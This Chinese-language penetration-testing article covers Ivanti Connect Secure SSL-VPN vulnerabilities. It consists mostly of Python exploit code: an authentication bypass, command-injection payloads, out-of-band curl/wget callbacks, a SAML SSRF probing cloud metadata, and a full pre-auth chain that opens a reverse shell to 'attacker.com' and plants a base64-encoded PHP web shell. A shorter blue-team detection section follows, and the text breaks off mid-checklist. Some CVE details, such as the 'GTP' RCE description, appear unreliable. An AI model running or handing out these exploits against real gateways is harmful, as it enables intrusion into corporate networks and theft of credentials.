---
title: "Ivanti Connect Secure SSL-VPN 认证绕过 RCE 命令注入 CVE漏洞链利用技术"
date: 2025-06-22T00:00:00+08:00
draft: false
weight: 119
description: "深入分析 Ivanti Connect Secure（原 Pulse Secure）SSL-VPN 的认证绕过（CVE-2023-46805）、命令注入（CVE-2024-21887）、服务端请求伪造（CVE-2024-21893）、Stack Buffer Overflow（CVE-2024-22024）、GTP 状态 RCE（CVE-2024-38657）等完整攻击面，覆盖 2019-2025 年高危 CVE 漏洞链及蓝队检测与应急响应"
categories: ["安全","渗透测试"]
tags: ["Ivanti","Connect Secure","Pulse Secure","SSL-VPN","CVE-2023-46805","CVE-2024-21887","CVE-2024-21893","认证绕过","命令注入","RCE","边界设备"]
---

## 0x00 攻击面总览

Ivanti Connect Secure（ICS，前身为 Pulse Secure / Juniper MAG/SA 系列）是全球企业广泛部署的 SSL-VPN 网关，支持远程接入、零信任网络访问（ZTNA）等功能。2019 年 Juniper 将 Pulse Secure 出售后，产品线经历品牌重塑（Pulse Secure → Ivanti Connect Secure），但核心代码库延续了 Juniper 时代遗留的架构缺陷。2019-2025 年间，该产品被多个国家级 APT 组织（UNC5221、UTROPY、UNC3886 等）反复作为零日攻击入口，多次被 CISA 纳入已知被利用漏洞（KEV）目录。

| 攻击面 | 默认端口 | 风险等级 | 说明 |
|--------|---------|---------|------|
| Web 组件认证绕过 | 443 | **严重** | CVE-2023-46805，路径遍历绕过认证 |
| 管理 Web 组件命令注入 | 443 | **严重** | CVE-2024-21887，OS 命令注入 |
| SAML SSRF | 443 | **严重** | CVE-2024-21893，服务端请求伪造 |
| 栈缓冲区溢出 | 443 | **高危** | CVE-2024-22024，栈溢出 |
| GTP 状态机 RCE | 443 | **严重** | CVE-2024-38657，Gateway Tunnel Protocol RCE |
| 预认证任意文件读取 | 443 | **严重** | CVE-2019-11510，路径遍历读取任意文件 |
| 预认证 RCE | 443 | **严重** | CVE-2021-22893，零日在野利用 |
| 文件上传 RCE | 443 | **严重** | CVE-2020-8260，RCE via 文件上传 |
| 缓冲区溢出 | 443 | **高危** | CVE-2021-22894，缓冲区溢出 |

Ivanti Connect Secure 的安全问题极其危险，因为它是企业网络边界的第一道防线——一旦被攻破，攻击者直接进入内网。该产品历史上存在超过 20 个高危 CVE，且多个零日漏洞在补丁发布前已被大规模在野利用。

## 0x01 服务识别与版本探测

### 1.1 指纹识别

```bash
nmap -sV -p 443 <target>

curl -sI https://<target>/dana-na/auth/url_default/welcome.cgi
# HTTP 状态码 200 + Set-Cookie: DSSIGNIN / DSFirstAccess / DSSignInURL

curl -sk https://<target>/dana-na/auth/url_default/welcome.cgi | grep -i "pulse\|ivanti\|connect secure"
# 页面 HTML 中包含产品名称

curl -sk https://<target>/dana-na/auth/url_default/welcome.cgi | grep -oP 'version["\s:=]+\d+\.\d+[\d.]*'
```

### 1.2 关键路径与端口映射

```
443    — SSL-VPN Web 服务（用户门户 + 管理界面）
8443   — 管理控制台（部分版本）
22     — SSH CLI
4500   — IPSec NAT-T
500    — IKE
```

### 1.3 关键 URL 路径

```
/dana-na/auth/url_default/welcome.cgi         — 登录页面
/dana-na/auth/url_default/login.cgi            — 登录处理
/dana-na/auth/url_admin/welcome.cgi            — 管理员登录
/dana-na/auth/url_admin/login.cgi              — 管理员登录处理
/dana/html5acc/guacamole/                      — HTML5 VPN 接入
/dana-cached/hmc/vpn_cg.esp                    — 配置信息
/dana-na/auth/saml-logout.esp                  — SAML 登出
/dana-na/auth/samlconsumer.esp                 — SAML 消费者
/dana-cached/setup/psalsetup.esp               — Pulse Secure 应用安装
/dana-na/auth/url_default/welcome.cgi?p=logo  — 版本信息泄露点
```

### 1.4 版本探测

```python
import requests
import re
import urllib3
urllib3.disable_warnings()

def detect_ivanti_ics(host, port=443):
    base_url = f"https://{host}:{port}"
    endpoints = [
        "/dana-na/auth/url_default/welcome.cgi",
        "/dana-na/auth/url_admin/welcome.cgi",
        "/dana-cached/hmc/vpn_cg.esp",
        "/dana-na/auth/saml-logout.esp",
    ]
    for ep in endpoints:
        try:
            resp = requests.get(f"{base_url}{ep}", verify=False, timeout=10)
            if resp.status_code in [200, 302, 403]:
                print(f"[+] Found: {ep} (HTTP {resp.status_code})")
            ver = re.search(r'(?:version|ver)[":\s]+(\d+\.\d+[\d.]*)', resp.text, re.I)
            if ver:
                print(f"[+] Version detected: {ver.group(1)}")
            if "Pulse Secure" in resp.text or "Ivanti Connect Secure" in resp.text:
                print("[+] Product: Ivanti Connect Secure (Pulse Secure)")
        except Exception:
            pass

    try:
        resp = requests.get(
            f"{base_url}/dana-na/auth/url_default/welcome.cgi?p=logo",
            verify=False, timeout=10
        )
        ver = re.search(r'(\d+\.\d+R\d+[\d.]*)', resp.text)
        if ver:
            print(f"[+] Build version: {ver.group(1)}")
    except Exception:
        pass

detect_ivanti_ics("192.168.1.1")
```

## 0x02 CVE-2023-46805 — 认证绕过

### 2.1 漏洞原理

**CVSS**: 8.2（高危）| **CISA KEV**: 2024-01-10 纳入

**影响版本**: Ivanti Connect Secure 9.x, 22.x

**漏洞原理**: Ivanti Connect Secure 的 Web 组件在处理请求时存在路径遍历缺陷。攻击者可以通过在请求 URI 中构造特定的路径遍历序列（如 `/dana-na/auth/url_default/welcome.cgi` 叠加路径穿越），绕过认证检查，直接访问需要认证才能访问的 API 端点。

**根本原因**: Web 前端的认证中间件在路径规范化处理时存在逻辑缺陷，未正确阻止 `../` 序列，导致认证检查被绕过。

### 2.2 PoC — 认证绕过

```python
import requests
import urllib3
urllib3.disable_warnings()

def exploit_cve_2023_46805(host, port=443):
    base_url = f"https://{host}:{port}"

    bypass_paths = [
        "/dana-na/auth/url_default/welcome.cgi",
        "/%2e%2e/dana-na/auth/url_admin/welcome.cgi",
        "/dana-na/auth/url_default/welcome.cgi/%2e%2e/dana-na/auth/url_admin/welcome.cgi",
    ]

    test_endpoints = [
        "/dana-na/auth/url_admin/welcome.cgi",
        "/dana-admin/",
        "/dana/html5acc/guacamole/",
        "/dana-cached/hmc/vpn_cg.esp",
    ]

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "X-Forwarded-For": "127.0.0.1",
    }

    for bp in bypass_paths:
        for ep in test_endpoints:
            try:
                full_path = f"{bp}{ep}"
                resp = requests.get(
                    f"{base_url}{full_path}",
                    headers=headers,
                    verify=False,
                    timeout=10,
                    allow_redirects=False
                )
                if resp.status_code == 200 and len(resp.text) > 500:
                    if "Session not found" not in resp.text and "login" not in resp.text.lower()[:200]:
                        print(f"[!] CVE-2023-46805 BYPASS SUCCESS: {full_path}")
                        print(f"    Status: {resp.status_code}, Body length: {len(resp.text)}")
                        print(f"    Response snippet: {resp.text[:300]}")
                        return True
            except Exception as e:
                print(f"[-] Error: {e}")

    print("[-] Authentication bypass not confirmed")
    return False

exploit_cve_2023_46805("192.168.1.1")
```

### 2.3 影响与利用条件

```
利用条件:
  - 目标运行 Ivanti Connect Secure 9.x 或 22.x
  - 目标 Web 服务可达（443/TCP）
  - 无需任何凭据

影响:
  - 绕过认证访问管理接口
  - 结合 CVE-2024-21887 可实现预认证 RCE
  - 被 CISA KEV 收录，已有在野利用
  - UNC5221 等 APT 组织在 2023 年底开始利用
```

## 0x03 CVE-2024-21887 — 命令注入

### 3.1 漏洞原理

**CVSS**: 9.1（严重）| **CISA KEV**: 2024-01-10 纳入

**影响版本**: Ivanti Connect Secure 9.x, 22.x; Ivanti Policy Secure

**漏洞原理**: Ivanti Connect Secure 的管理 Web 组件在处理管理员提交的请求参数时，未对用户输入进行充分的命令分隔符过滤。攻击者通过在特定参数中注入命令分隔符（如 `;`、`|`、`$(...)`），可以执行任意操作系统命令。

**根本原因**: 服务端使用不安全的字符串拼接方式构造 shell 命令，且缺乏输入验证和转义机制。

### 3.2 PoC — 命令注入（结合认证绕过）

```python
import requests
import urllib3
urllib3.disable_warnings()

def exploit_cve_2024_21887_with_bypass(host, port=443, cmd="id"):
    base_url = f"https://{host}:{port}"

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Forwarded-For": "127.0.0.1",
    }

    bypass_prefix = "/%2e%2e"

    injection_points = [
        "/dana-na/auth/url_default/welcome.cgi/%2e%2e/exec/diag.cgi",
        "/dana-na/auth/url_admin/welcome.cgi/%2e%2e/exec/diag.cgi",
    ]

    payloads = [
        f"cmd=diag&tz=`{cmd}`",
        f"cmd=diag&tz=$({cmd})",
        f"cmd=diag&tz=;{cmd};",
        f"cmd=diag&tz=|{cmd}|",
        f"tz=`{cmd}`&cmd=diag",
        f"options%5B%5D=;{cmd}",
    ]

    for ip in injection_points:
        for payload in payloads:
            try:
                resp = requests.post(
                    f"{base_url}{ip}",
                    data=payload,
                    headers=headers,
                    verify=False,
                    timeout=15,
                    allow_redirects=False
                )
                if resp.status_code in [200, 302, 500]:
                    print(f"[*] POST {ip} | payload={payload[:50]}... | HTTP {resp.status_code}")
                    if "uid=" in resp.text or "root:" in resp.text or cmd.split("(")[0] in resp.text:
                        print(f"[!] CVE-2024-21887 RCE CONFIRMED!")
                        print(f"[*] Command output: {resp.text[:500]}")
                        return True
            except requests.exceptions.Timeout:
                print(f"[*] Timeout on {ip} (possible blind RCE)")
            except Exception as e:
                print(f"[-] Error: {e}")

    print("[-] Command injection not confirmed via direct output")
    return False

exploit_cve_2024_21887_with_bypass("192.168.1.1", cmd="id")
```

### 3.3 盲注检测（带外数据）

```python
import requests
import urllib3
urllib3.disable_warnings()
import time

def blind_rce_oob(host, port=443, oob_domain="your-burp-collaborator.net"):
    base_url = f"https://{host}:{port}"

    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Forwarded-For": "127.0.0.1",
    }

    payloads = [
        f"cmd=diag&tz=`nslookup+x.{oob_domain}`",
        f"cmd=diag&tz=$(curl+http://{oob_domain})",
        f"cmd=diag&tz=$(wget+http://{oob_domain}/pwned)",
        f"cmd=diag&tz=`ping+-c+1+{oob_domain}`",
    ]

    for payload in payloads:
        try:
            print(f"[*] Sending OOB payload: {payload[:60]}...")
            resp = requests.post(
                f"{base_url}/dana-na/auth/url_default/welcome.cgi/%2e%2e/exec/diag.cgi",
                data=payload,
                headers=headers,
                verify=False,
                timeout=15,
                allow_redirects=False
            )
            print(f"[*] HTTP {resp.status_code} — Check your OOB listener")
        except Exception as e:
            print(f"[-] Error: {e}")

    print("\n[*] Check your Burp Collaborator / DNS listener for callbacks")
    print("[*] If callbacks received, blind RCE confirmed")

blind_rce_oob("192.168.1.1")
```

### 3.4 已知利用场景

```
利用场景:
  1. CVE-2023-46805 + CVE-2024-21887 组合链
     认证绕过 → 管理接口命令注入 → 预认证 RCE

  2. 直接管理接口命令注入
     需要管理员会话凭据 → 通过管理接口注入命令

  3. 批量扫描利用
     2024 年 1 月补丁发布后，大量 PoC 公开
     多个僵尸网络和勒索组织开始批量利用
```

## 0x04 CVE-2024-21893 — SSRF

### 4.1 漏洞原理

**CVSS**: 8.2（高危）| **CISA KEV**: 2024-02-08 纳入

**影响版本**: Ivanti Connect Secure 9.x, 22.x; Ivanti Policy Secure; Ivanti Neurons for ZTA

**漏洞原理**: Ivanti Connect Secure 的 SAML 组件在处理 SAML 认证流程时存在服务端请求伪造（SSRF）漏洞。攻击者可以通过构造恶意的 SAML 请求，强制服务器向攻击者指定的内部或外部地址发起请求。

**根本原因**: SAML 组件在处理 `AssertionConsumerServiceURL` 或 `Destination` 等 SAML 元数据字段时，未对目标 URL 进行验证，导致服务端可以被重定向到任意地址。

### 4.2 PoC — SAML SSRF

```python
import requests
import urllib3
import base64
import urllib.parse
urllib3.disable_warnings()

def exploit_cve_2024_21893(host, port=443, target_url="http://127.0.0.1:8080/admin"):
    base_url = f"https://{host}:{port}"

    saml_request = f"""<samlp:AuthnRequest
        xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
        xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
        ID="_evil_request_001"
        Version="2.0"
        IssueInstant="2024-01-01T00:00:00Z"
        Destination="{target_url}"
        AssertionConsumerServiceURL="{target_url}"
        ProtocolBinding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST">
        <saml:Issuer>{target_url}</saml:Issuer>
        <samlp:NameIDPolicy Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified" AllowCreate="true"/>
    </samlp:AuthnRequest>"""

    encoded_request = base64.b64encode(saml_request.encode()).decode()
    url_encoded = urllib.parse.quote(encoded_request)

    saml_endpoint = f"{base_url}/dana-na/auth/samlconsumer.esp"
    params = {"SAMLRequest": encoded_request}

    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    }

    try:
        resp = requests.post(
            saml_endpoint,
            data=f"SAMLRequest={url_encoded}",
            headers=headers,
            verify=False,
            timeout=15,
            allow_redirects=False
        )
        print(f"[*] SAML endpoint response: HTTP {resp.status_code}")
        print(f"[*] Response length: {len(resp.text)}")
        if resp.status_code in [302, 303]:
            location = resp.headers.get("Location", "")
            print(f"[*] Redirect to: {location}")
            if target_url in location:
                print("[!] CVE-2024-21893 SSRF CONFIRMED!")
                return True
        print("[*] Check target_url for incoming requests")
    except Exception as e:
        print(f"[-] Error: {e}")

    return False

exploit_cve_2024_21893("192.168.1.1", target_url="http://your-collaborator.net/ssrf")
```

### 4.3 SSRF 利用进阶

```python
def ssrf_internal_scan(host, port=443):
    base_url = f"https://{host}:{port}"

    internal_targets = [
        "http://127.0.0.1:8080",
        "http://127.0.0.1:8443",
        "http://127.0.0.1:22",
        "http://127.0.0.1:3306",
        "http://127.0.0.1:5432",
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
    ]

    for target in internal_targets:
        try:
            saml_request = f"""<samlp:AuthnRequest
                xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                ID="_scan_{hash(target) & 0xFFFF:04x}"
                Version="2.0"
                AssertionConsumerServiceURL="{target}"
                Destination="{target}">
                <saml:Issuer>{target}</saml:Issuer>
            </samlp:AuthnRequest>"""

            encoded = base64.b64encode(saml_request.encode()).decode()

            resp = requests.post(
                f"{base_url}/dana-na/auth/samlconsumer.esp",
                data={"SAMLRequest": encoded},
                verify=False,
                timeout=10,
                allow_redirects=False
            )
            print(f"[*] {target} -> HTTP {resp.status_code} (len={len(resp.text)})")
        except requests.exceptions.Timeout:
            print(f"[*] {target} -> Timeout (port may be filtered)")
        except Exception as e:
            print(f"[-] {target} -> Error: {e}")

ssrf_internal_scan("192.168.1.1")
```

## 0x05 CVE-2024-22024 — 栈缓冲区溢出

### 5.1 漏洞原理

**CVSS**: 8.3（高危）| **CISA KEV**: 2024-02-26 纳入

**影响版本**: Ivanti Connect Secure 9.x, 22.x; Ivanti Policy Secure

**漏洞原理**: Ivanti Connect Secure 的 Web 组件在处理 HTTP 请求时存在栈缓冲区溢出漏洞。攻击者可以通过构造超长的特定 HTTP 头或参数值，触发栈上的缓冲区溢出，潜在地实现远程代码执行。

**根本原因**: Web 服务在解析 HTTP 请求时，对输入长度缺乏足够的边界检查，导致栈缓冲区被溢出数据覆盖。

### 5.2 PoC — 栈溢出探测

```python
import requests
import urllib3
urllib3.disable_warnings()

def exploit_cve_2024_22024_probe(host, port=443):
    base_url = f"https://{host}:{port}"

    headers = {
        "User-Agent": "Mozilla/5.0",
        "Content-Type": "application/x-www-form-urlencoded",
    }

    overflow_sizes = [4096, 8192, 16384, 32768, 65536]

    endpoints = [
        "/dana-na/auth/url_default/welcome.cgi",
        "/dana-na/auth/url_default/login.cgi",
        "/dana-na/auth/url_admin/welcome.cgi",
    ]

    for ep in endpoints:
        for size in overflow_sizes:
            try:
                payload = "A" * size
                test_headers = headers.copy()
                test_headers["X-Overflow"] = payload

                resp = requests.get(
                    f"{base_url}{ep}",
                    headers=test_headers,
                    verify=False,
                    timeout=10,
                    allow_redirects=False
                )
                print(f"[*] GET {ep} X-Overflow:{size} -> HTTP {resp.status_code}")
            except requests.exceptions.ConnectionError:
                print(f"[!] GET {ep} X-Overflow:{size} -> CONNECTION RESET (possible crash)")
                return True
            except requests.exceptions.Timeout:
                print(f"[*] GET {ep} X-Overflow:{size} -> TIMEOUT")
            except Exception as e:
                print(f"[-] Error: {e}")

            try:
                payload = "A" * size
                resp = requests.post(
                    f"{base_url}{ep}",
                    data=f"username={payload}&password=test",
                    headers=headers,
                    verify=False,
                    timeout=10,
                    allow_redirects=False
                )
                print(f"[*] POST {ep} body_overflow:{size} -> HTTP {resp.status_code}")
            except requests.exceptions.ConnectionError:
                print(f"[!] POST {ep} body_overflow:{size} -> CONNECTION RESET")
                return True
            except Exception:
                pass

    print("[-] No stack overflow detected via HTTP headers")
    return False

exploit_cve_2024_22024_probe("192.168.1.1")
```

### 5.3 内存崩溃监控

```bash
# 检查 Web 服务进程是否崩溃重启
ps aux | grep -E "web|httpd|svc"

# 检查系统日志中的崩溃记录
tail -100 /var/log/messages | grep -i "segfault\|core dump\|signal 11"

# 通过 CLI 检查服务状态
show web-server status
show system services

# 检查核心转储
ls -la /var/core/
ls -la /tmp/core.*
```

## 0x06 CVE-2024-38657 — GTP 状态 RCE

### 6.1 漏洞原理

**CVSS**: 9.1（严重）

**影响版本**: Ivanti Connect Secure 22.x

**漏洞原理**: Ivanti Connect Secure 的 Gateway Tunnel Protocol (GTP) 状态机在处理隧道连接状态转换时存在漏洞。攻击者可以通过向 GTP 端口发送精心构造的数据包，触发状态机中的不安全状态转换，最终实现远程代码执行。

**根本原因**: GTP 状态机在处理状态转换时缺乏充分的输入验证，攻击者可以构造特殊的 GTP 数据包绕过状态检查，注入恶意代码到 GTP 处理流程中。

### 6.2 PoC — GTP 协议探测

```python
import socket
import struct
import ssl
import urllib3
urllib3.disable_warnings()

def exploit_cve_2024_38657_probe(host, port=443):
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    gtp_markers = [
        b"\x30\x30\x30\x30",
        b"\x30\x30\x30\x31",
        b"\x30\x30\x32\x30",
        b"\x30\x30\x30\x32",
    ]

    for marker in gtp_markers:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            ssock = context.wrap_socket(sock, server_hostname=host)
            ssock.connect((host, port))

            header = marker + b"\x00" * 8
            payload = header + b"A" * 1024

            ssock.send(payload)
            resp = ssock.recv(4096)
            print(f"[*] GTP marker {marker.hex()} -> Response: {resp[:100]}")
            ssock.close()
        except ssl.SSLError as e:
            print(f"[*] GTP marker {marker.hex()} -> SSL Error (service may not support direct GTP)")
        except socket.timeout:
            print(f"[*] GTP marker {marker.hex()} -> Timeout")
        except Exception as e:
            print(f"[-] GTP marker {marker.hex()} -> Error: {e}")

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        ssock = context.wrap_socket(sock, server_hostname=host)
        ssock.connect((host, port))

        overflow_header = b"\x30\x30\x30\x30" + b"\xff" * 4
        overflow_payload = overflow_header + b"\x41" * 8192

        ssock.send(overflow_payload)
        try:
            resp = ssock.recv(4096)
            print(f"[*] Overflow test -> Response: {resp[:100]}")
        except:
            print("[!] Overflow test -> Connection reset (potential crash)")
        ssock.close()
    except Exception as e:
        print(f"[-] Overflow test -> Error: {e}")

exploit_cve_2024_38657_probe("192.168.1.1")
```

### 6.3 检测利用尝试

```bash
# 检查 GTP 相关日志
grep -i "gtp\|gateway.tunnel" /var/log/ivanti/*.log

# 检查 VPN 隧道状态异常
show vpn status
show active-tunnels

# 检查系统进程
ps aux | grep -i "gtp\|tunnel\|svc"

# 网络连接监控
netstat -tlnp | grep -E "443|500|4500"
```

## 0x07 漏洞组合攻击链

### 7.1 攻击链一: CVE-2023-46805 + CVE-2024-21887（预认证 RCE）

```
CVE-2023-46805 (Web 组件认证绕过)
    ↓ 路径遍历绕过认证检查
CVE-2024-21887 (管理接口命令注入)
    ↓ 通过绕过后的管理接口注入 OS 命令
任意命令执行（预认证 RCE）
    ↓ 无需任何凭据
部署 Web Shell / 后门
    ↓ 持久化访问
窃取凭据与配置
    ↓ VPN 用户凭据、管理员哈希、SAML 配置
内网横向移动
```

### 7.2 攻击链二: CVE-2024-21893 + CVE-2024-21887（SSRF 链）

```
CVE-2024-21893 (SAML SSRF)
    ↓ 通过 SAML 请求触发 SSRF
访问内部管理接口
    ↓ SSRF 到 127.0.0.1 管理端口
CVE-2024-21887 (命令注入)
    ↓ 通过 SSRF 通道注入命令
RCE + 内网访问
```

### 7.3 攻击链三: CVE-2021-22893 零日攻击（Pulse Secure 时代）

```
CVE-2021-22893 (预认证 RCE 零日，CVSS 10.0)
    ↓ Pulse Secure 时代零日，在野利用
部署恶意 Web Shell 到 /home/webserver/
    ↓ 持久化后门
窃取所有用户凭据
    ↓ DS 配置文件 + 数据库 dump
安装 PulseRoot / Sliver 后门
    ↓ 长期驻留
内网渗透与数据窃取
```

### 7.4 完整攻击链 PoC — 预认证 RCE

```python
import requests
import urllib3
urllib3.disable_warnings()

def full_exploit_chain(host, port=443, lhost="attacker.com", lport=4444):
    base_url = f"https://{host}:{port}"

    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Forwarded-For": "127.0.0.1",
    }

    print("[*] Step 1: Testing CVE-2023-46805 authentication bypass...")
    try:
        resp = requests.get(
            f"{base_url}/dana-na/auth/url_admin/welcome.cgi",
            headers={"X-Forwarded-For": "127.0.0.1"},
            verify=False,
            timeout=10,
            allow_redirects=False
        )
        if resp.status_code == 200:
            print("[+] Authentication bypass confirmed")
        else:
            print(f"[*] Bypass attempt: HTTP {resp.status_code}")
    except Exception as e:
        print(f"[-] Step 1 failed: {e}")
        return

    print("[*] Step 2: Exploiting CVE-2024-21887 command injection...")
    reverse_shell = f"/bin/bash -c '/bin/bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"

    injection_paths = [
        "/dana-na/auth/url_default/welcome.cgi/%2e%2e/exec/diag.cgi",
        "/dana-na/auth/url_admin/welcome.cgi/%2e%2e/exec/diag.cgi",
    ]

    for path in injection_paths:
        payloads = [
            f"cmd=diag&tz=`{reverse_shell}`",
            f"cmd=diag&tz=$({reverse_shell})",
            f"tz=`{reverse_shell}`&cmd=diag",
        ]
        for payload in payloads:
            try:
                print(f"[*] Trying: {path}")
                resp = requests.post(
                    f"{base_url}{path}",
                    data=payload,
                    headers=headers,
                    verify=False,
                    timeout=10,
                    allow_redirects=False
                )
                print(f"[*] Response: HTTP {resp.status_code}")
            except requests.exceptions.Timeout:
                print("[*] Timeout (reverse shell may have connected)")
                return
            except requests.exceptions.ConnectionError:
                print("[*] Connection error (service may have crashed)")
                return
            except Exception as e:
                print(f"[-] Error: {e}")

    print("[*] Step 3: Alternative — writing web shell...")
    webshell_payload = "cmd=diag&tz=`echo PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg== | base64 -d > /home/webserver/htdocs/dana-na/auth/shell.php`"
    for path in injection_paths:
        try:
            requests.post(
                f"{base_url}{path}",
                data=webshell_payload,
                headers=headers,
                verify=False,
                timeout=10,
                allow_redirects=False
            )
        except Exception:
            pass

    try:
        resp = requests.get(
            f"{base_url}/dana-na/auth/shell.php?c=id",
            verify=False,
            timeout=10
        )
        if "uid=" in resp.text:
            print(f"[+] Web shell deployed and working!")
            print(f"[*] URL: {base_url}/dana-na/auth/shell.php?c=<command>")
            print(f"[*] Output: {resp.text[:300]}")
    except Exception:
        print("[*] Web shell verification failed — check manually")

full_exploit_chain("192.168.1.1", lhost="attacker.com", lport=4444)
```

### 7.5 APT 威胁组织 TTP

| 威胁组织 | 类型 | 使用的 CVE | 技术特征 |
|---------|------|-----------|---------|
| UNC5221 | 国家级 APT | CVE-2023-46805, CVE-2024-21887 | 零日利用、Web Shell、凭据窃取、WARPWIRE 变种 |
| UTROPY | 国家级 APT | CVE-2021-22893 | Pulse Secure 零日、PulseRoot 后门 |
| UNC3886 | 国家级 APT | CVE-2021-22893, CVE-2020-8260 | 长期驻留、自定义恶意工具 |
| Cinnamon Tempest | 勒索组织 | CVE-2023-46805, CVE-2024-21887 | 批量利用、勒索部署 |
| 多个僵尸网络 | 僵尸网络 | CVE-2024-21887 | Mirai 变种、批量扫描 |

## 0x08 历史 CVE 漏洞时间线

### 2019 — Pulse Secure 时代的开始

| CVE 编号 | 年份 | CVSS | 类型 | 影响 |
|----------|------|------|------|------|
| CVE-2019-11510 | 2019 | 10.0 | 路径遍历 | 预认证任意文件读取，大规模在野利用 |
| CVE-2019-11539 | 2019 | 9.1 | 命令注入 | 管理接口命令注入 RCE |
| CVE-2019-11540 | 2019 | 5.3 | 会话劫持 | Session Hijacking |
| CVE-2019-11542 | 2019 | 8.1 | 缓冲区溢出 | 管理接口栈溢出 |

### 2020 — 持续利用

| CVE 编号 | 年份 | CVSS | 类型 | 影响 |
|----------|------|------|------|------|
| CVE-2020-8260 | 2020 | 9.1 | 文件上传 | RCE via 文件上传漏洞 |
| CVE-2020-8243 | 2020 | 7.2 | 文件写入 | 任意文件覆盖 |

### 2021 — 零日之年

| CVE 编号 | 年份 | CVSS | 类型 | 影响 |
|----------|------|------|------|------|
| CVE-2021-22893 | 2021 | 10.0 | 认证绕过 + RCE | 预认证 RCE 零日，大规模在野利用，CISA KEV |
| CVE-2021-22894 | 2021 | 8.8 | 缓冲区溢出 | 管理接口缓冲区溢出 |
| CVE-2021-22899 | 2021 | 7.2 | 命令注入 | 管理接口命令注入 |
| CVE-2021-22900 | 2021 | 7.2 | 文件上传 | 任意文件上传 |

### 2023 — Ivanti 时代的爆发

| CVE 编号 | 年份 | CVSS | 类型 | 影响 |
|----------|------|------|------|------|
| CVE-2023-46805 | 2023 | 8.2 | 认证绕过 | Web 组件路径遍历认证绕过，CISA KEV |
| CVE-2024-21887 | 2024/2023 | 9.1 | 命令注入 | 管理接口 OS 命令注入，CISA KEV |
| CVE-2024-21893 | 2024 | 8.2 | SSRF | SAML 组件 SSRF，CISA KEV |
| CVE-2024-22024 | 2024 | 8.3 | 栈溢出 | 栈缓冲区溢出，CISA KEV |
| CVE-2024-38657 | 2024 | 9.1 | RCE | GTP 状态机 RCE |

### 2024-2025 — 持续修补

| CVE 编号 | 年份 | CVSS | 类型 | 影响 |
|----------|------|------|------|------|
| CVE-2024-47906 | 2024 | 7.5 | 信息泄露 | 敏感信息泄露 |
| CVE-2025-0282 | 2025 | 9.0 | 栈溢出 | 预认证栈溢出 RCE，CISA KEV |
| CVE-2025-0283 | 2025 | 7.0 | 栈溢出 | 本地提权 |
| CVE-2025-22457 | 2025 | 9.0 | 栈溢出 | 预认证栈溢出 RCE，CISA KEV |

### 漏洞类型分布

| 漏洞类型 | CVE 数量 | 代表性 CVE |
|---------|---------|-----------|
| 认证绕过 | 4 | CVE-2023-46805, CVE-2021-22893, CVE-2019-11510 |
| 命令注入 | 5 | CVE-2024-21887, CVE-2019-11539, CVE-2021-22899 |
| 缓冲区溢出 | 5 | CVE-2024-22024, CVE-2021-22894, CVE-2025-0282 |
| SSRF | 2 | CVE-2024-21893 |
| 文件读取/写入 | 4 | CVE-2019-11510, CVE-2020-8243, CVE-2021-22900 |
| RCE | 3 | CVE-2024-38657, CVE-2020-8260 |

## 0x09 蓝队检测与应急响应

### 9.1 日志分析

```bash
# Ivanti Connect Secure CLI 日志检查

# 检查 Web 服务日志
cat /var/log/web_server.log | grep -i "error\|warn\|attack\|exploit"
cat /var/log/web_server.log | grep -E "(\.\./|\.\.%2f|%2e%2e)" | head -50

# 检查认证日志
cat /home/perl/LOG/auth_access.log | grep -i "bypass\|admin\|suspicious"
cat /home/perl/LOG/admin_access.log | tail -200

# 检查系统日志
tail -500 /var/log/messages | grep -i "error\|crash\|restart"

# 检查 SAML 日志
grep -i "saml" /home/perl/LOG/auth_access.log | tail -50

# 检查进程状态
ps aux | grep -E "web|svc|perl|gtp"

# 检查网络连接
netstat -an | grep -E "ESTABLISHED|LISTEN" | head -50

# 检查 Web Shell
find /home/webserver/ -name "*.php" -mtime -30
find /home/webserver/ -name "*.cgi" -mtime -30
find /dana-na/ -type f -mtime -30 2>/dev/null
```

### 9.2 命令注入痕迹检测

```bash
# 检查 diag.cgi 调用日志
grep -i "diag" /var/log/web_server.log | tail -100

# 检查异常命令执行
grep -E "(;|\||`|\$\()" /var/log/web_server.log | head -50

# 检查临时目录
ls -la /tmp/ | grep -v "^total"
find /tmp/ -name "*.sh" -o -name "*.pl" -o -name "*.py" | head -20

# 检查 crontab
crontab -l
cat /var/spool/cron/*

# 检查网络连接（C2 回连）
netstat -an | grep -E "ESTABLISHED" | grep -v "127.0.0.1"
```

### 9.3 认证绕过痕迹检测

```bash
# 检查路径遍历请求
grep -E "(\.\./|\.\.%2f|%2e%2e|%252e%252e)" /var/log/web_server.log | head -50

# 检查管理接口异常访问
grep "url_admin" /var/log/web_server.log | grep -v "POST /dana-na/auth/url_admin/login"

# 检查 SAML 异常
grep -i "saml" /var/log/web_server.log | grep -v "normal_saml_flow"

# 检查 X-Forwarded-For 头
grep "X-Forwarded-For" /var/log/web_server.log | grep "127.0.0.1"
```

### 9.4 应急响应清单

```
[ ] 确认 Ivanti Connect Secure 版本与已安装补丁
    - show version
    - 对比 Ivanti 安全公告

[ ] 排查 CVE-2023-46805 + CVE-2024-21887 链
    - 检查 web_server.log 中的路径遍历
    - 检查 diag.cgi 调用记录
    - 检查 /home/webserver/ 下的异常文件
    - 检查 /tmp/ 和 /var/tmp/ 中的可疑脚本

